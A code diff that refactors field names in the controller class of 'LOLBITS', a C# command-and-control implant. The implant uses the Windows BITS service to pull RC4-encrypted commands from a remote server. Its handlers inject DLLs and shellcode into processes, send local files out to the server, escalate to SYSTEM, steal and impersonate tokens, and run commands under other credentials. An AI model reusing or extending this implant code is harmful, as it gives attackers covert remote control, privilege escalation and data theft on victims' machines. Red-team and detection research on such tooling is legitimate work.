@@ -16,42 +16,39 @@ namespace LOLBITS
 
     public class Controller
     {
-
-       
-
-        private const string Contid = "7061796c676164";
-        private string P;
-        private string Id;
-        private string Auth;
-        private string[] RestoreKeys;
-        private string Url;
-        private string TempPath;
-        private TokenManager TokenManager;
-        private Jobs JobsManager;
-        private SyscallManager syscall;
+        private const string ContId = "7061796c676164";
+        private readonly string _p;
+        private string _id;
+        private string _auth;
+        private string[] _restoreKeys;
+        private readonly string _url;
+        private readonly string _tempPath;
+        private readonly TokenManager _tokenManager;
+        private readonly Jobs _jobsManager;
+        private readonly SyscallManager _sysCall;
 
         public Controller(string Id, string url,string password)
         {
-            this.Id = Id;
-            Url = url;
-            P = password;
-            JobsManager = new Jobs(Url);
-            syscall = new SyscallManager();
-            TokenManager = new TokenManager(syscall);
+            this._id = Id;
+            _url = url;
+            _p = password;
+            _jobsManager = new Jobs(_url);
+            _sysCall = new SyscallManager();
+            _tokenManager = new TokenManager(_sysCall);
 
             if (Environment.GetEnvironmentVariable("temp") != null)
             {
-                TempPath = Environment.GetEnvironmentVariable("temp");
+                _tempPath = Environment.GetEnvironmentVariable("temp");
             }
             else
             {
-                TempPath = @"C:\Windows\Temp\";
+                _tempPath = @"C:\Windows\Temp\";
             }
         }
 
         public string GetPassword()
         {
-            return P;
+            return _p;
         }
 
         public void Start()
@@ -60,21 +57,21 @@ namespace LOLBITS
             string startBits = "sc start BITS";
             Utils.ExecuteCommand(startBits);
             Thread.Sleep(500);
-            string filePath = TempPath + @"\" + Id;
+            string filePath = _tempPath + @"\" + _id;
 
             if (TryInitialCon(filePath))
             {
                 Content file = GetEncryptedFileContent(filePath, out var unused);
-                Id = file.NextId;
-                Auth = file.NextAuth;
-                RestoreKeys = file.Commands; 
+                _id = file.NextId;
+                _auth = file.NextAuth;
+                _restoreKeys = file.Commands; 
                 string domain = Environment.GetEnvironmentVariable("userdomain");
                 string user = Environment.GetEnvironmentVariable("username");
-                Response response = new Response(domain + @"\" + user, Auth);
-                filePath = TempPath + @"\" + Id + ".txt";
+                Response response = new Response(domain + @"\" + user, _auth);
+                filePath = _tempPath + @"\" + _id + ".txt";
                 EncryptResponseIntoFile(filePath, response);
 
-                JobsManager.Send(Id, filePath);
+                _jobsManager.Send(_id, filePath);
 
                 Loop();
                 
@@ -101,18 +98,18 @@ namespace LOLBITS
 
             while (!exit)
             {
-                filePath = TempPath + @"\" + Id;
+                filePath = _tempPath + @"\" + _id;
 
-                headers = "reqid: " + Auth;
-                Console.WriteLine("next: " + Id);
-                if (JobsManager.Get(Id, filePath, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
+                headers = "reqid: " + _auth;
+                Console.WriteLine("next: " + _id);
+                if (_jobsManager.Get(_id, filePath, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
                 {
                     Content file = GetEncryptedFileContent(filePath, out var unused);
 
-                    Id = file.NextId;
-                    Auth = file.NextAuth;
-                    Console.WriteLine("Id: " + Id);
-                    Console.WriteLine("Auth: " + Auth);
+                    _id = file.NextId;
+                    _auth = file.NextAuth;
+                    Console.WriteLine("Id: " + _id);
+                    Console.WriteLine("Auth: " + _auth);
 
                     if (file.Commands.Length > 0)
                         DoSomething(file);
@@ -124,10 +121,10 @@ namespace LOLBITS
                 else
                 {
 
-                    if (RestoreKeys.Length > 0)
+                    if (_restoreKeys.Length > 0)
                     {
-                        Auth = RestoreKeys[RestoreKeys.Length - 1];
-                        Array.Resize(ref RestoreKeys,RestoreKeys.Length - 1);
+                        _auth = _restoreKeys[_restoreKeys.Length - 1];
+                        Array.Resize(ref _restoreKeys,_restoreKeys.Length - 1);
                     }
                     else { exit = true; }
                 }
@@ -146,10 +143,10 @@ namespace LOLBITS
                 {
                     case "inject_dll":
                         {
-                            string fileP = TempPath + @"\" + Id;
-                            string headers = "reqid: " + Auth + "\r\ncontid: " + Contid;
+                            string fileP = _tempPath + @"\" + _id;
+                            string headers = "reqid: " + _auth + "\r\ncontid: " + ContId;
 
-                            if (JobsManager.Get(Id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
+                            if (_jobsManager.Get(_id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
                                 try
                                 {
@@ -183,14 +180,14 @@ namespace LOLBITS
 
                     case "inject_shellcode":
                         {
-                            string fileP = TempPath + @"\" + Id;
-                            string headers = "reqid: " + Auth + "\r\ncontid: " + Contid;
+                            string fileP = _tempPath + @"\" + _id;
+                            string headers = "reqid: " + _auth + "\r\ncontid: " + ContId;
                             int pid = -1;
                             if (file.Commands.Length >= 2)
                                 pid = int.Parse(file.Commands[1]);
 
 
-                            if (JobsManager.Get(Id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
+                            if (_jobsManager.Get(_id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
                                 byte[] sh;
                                 GetEncryptedFileContent(fileP, out sh);
@@ -198,7 +195,7 @@ namespace LOLBITS
                                 try
                                 {
 
-                                    LauncherShellcode.Main(sh, syscall, pid);
+                                    LauncherShellcode.Main(sh, _sysCall, pid);
                                     rps = "Shellcode injected!\n";
                                 }
                                 catch (Exception)
@@ -234,10 +231,10 @@ namespace LOLBITS
 
                     case "send":
                         {
-                            string fileP = TempPath + @"\" + Id;
-                            string headers = "reqid: " + Auth + "\r\ncontid: " + Contid;
+                            string fileP = _tempPath + @"\" + _id;
+                            string headers = "reqid: " + _auth + "\r\ncontid: " + ContId;
 
-                            if (JobsManager.Get(Id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
+                            if (_jobsManager.Get(_id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
                                 File.Copy(fileP, file.Commands[1], true);
                                 rps = "Dowload finished.\n";
@@ -253,7 +250,7 @@ namespace LOLBITS
                         {
                             if (File.Exists(file.Commands[1]))
                             {
-                                if (JobsManager.Send(file.Commands[2], file.Commands[1]))
+                                if (_jobsManager.Send(file.Commands[2], file.Commands[1]))
                                 {
                                     rps = "Exfiltration succeed.\n";
 
@@ -269,8 +266,8 @@ namespace LOLBITS
                     case "getsystem":
                         {
 
-                            if (Utils.IsHighIntegrity(syscall))
-                                rps = TokenManager.getSystem() ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
+                            if (Utils.IsHighIntegrity(_sysCall))
+                                rps = _tokenManager.getSystem() ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
                             else
                                 rps = "ERR:Process failed! Is this process running with high integrity level?\n";
 
@@ -279,7 +276,7 @@ namespace LOLBITS
 
                     case "rev2self":
                         {
-                            TokenManager.Rev2Self();
+                            _tokenManager.Rev2Self();
                             rps = "Welcome back.\n";
 
                             break;
@@ -303,7 +300,7 @@ namespace LOLBITS
 
                             password = file.Commands[2];
 
-                            rps = TokenManager.Runas(domain, user, password) ? "Success!" : "ERR:Invalid credentials.";
+                            rps = _tokenManager.Runas(domain, user, password) ? "Success!" : "ERR:Invalid credentials.";
 
 
                             break;
@@ -319,7 +316,7 @@ namespace LOLBITS
                         {
                             try
                             {
-                                if (TokenManager.Impersonate(int.Parse(file.Commands[1])))
+                                if (_tokenManager.Impersonate(int.Parse(file.Commands[1])))
                                     rps = "Impersonation achieved!\n";
                                 else
                                     rps = "ERR: Not enough privileges!\n";
@@ -351,8 +348,8 @@ namespace LOLBITS
             {
                 rps = "ERR: Something went wrong!";
             }
-            Response response = new Response(rps, Auth);
-            string filePath = TempPath + @"\" + Id + ".txt";
+            Response response = new Response(rps, _auth);
+            string filePath = _tempPath + @"\" + _id + ".txt";
             EncryptResponseIntoFile(filePath, response);
             TrySend(filePath);
 
@@ -394,7 +391,7 @@ namespace LOLBITS
             int cont = 0;
             while (cont < 5)
             {
-                if (JobsManager.Send(Id, filePath))
+                if (_jobsManager.Send(_id, filePath))
                 {
                     return true;
                 }
@@ -408,7 +405,7 @@ namespace LOLBITS
             int cont = 0;
             while (cont < 5)
             {
-                if(JobsManager.Get(Id, filePath, null,BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
+                if(_jobsManager.Get(_id, filePath, null,BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
                 {
                     return true;
                 }
@@ -422,7 +419,7 @@ namespace LOLBITS
         {
             string json_response = JsonConvert.SerializeObject(response);
             byte[] content_decrypted = Encoding.UTF8.GetBytes(json_response);
-            byte[] xKey = Encoding.ASCII.GetBytes(P);
+            byte[] xKey = Encoding.ASCII.GetBytes(_p);
             byte[] content_encrypted = RC4.Encrypt(xKey, content_decrypted);
             string hexadecimal = BiteArrayToHex.Convierte(content_encrypted);
             string fileContent = Zipea.Comprime(hexadecimal);
@@ -433,7 +430,7 @@ namespace LOLBITS
         {
 
             string fileStr = File.ReadAllText(filePath);
-            byte[] xKey = Encoding.ASCII.GetBytes(P);
+            byte[] xKey = Encoding.ASCII.GetBytes(_p);
             string hexadecimal = Zipea.Descomprime(fileStr);
             byte[] content_encrypted = StringHEXToByteArray.Convierte(hexadecimal); 
             byte[] content_decrypted = RC4.Decrypt(xKey, content_encrypted);
@@ -454,7 +451,7 @@ namespace LOLBITS
         private Assembly LoadDll(string filePath)
         {
             string fileStr = File.ReadAllText(filePath);
-            byte[] xKey = Encoding.ASCII.GetBytes(P);
+            byte[] xKey = Encoding.ASCII.GetBytes(_p);
             string hexadecimal = Zipea.Descomprime(fileStr);
             byte[] content_encrypted = StringHEXToByteArray.Convierte(hexadecimal);
             byte[] content_decrypted = RC4.Decrypt(xKey, content_encrypted);
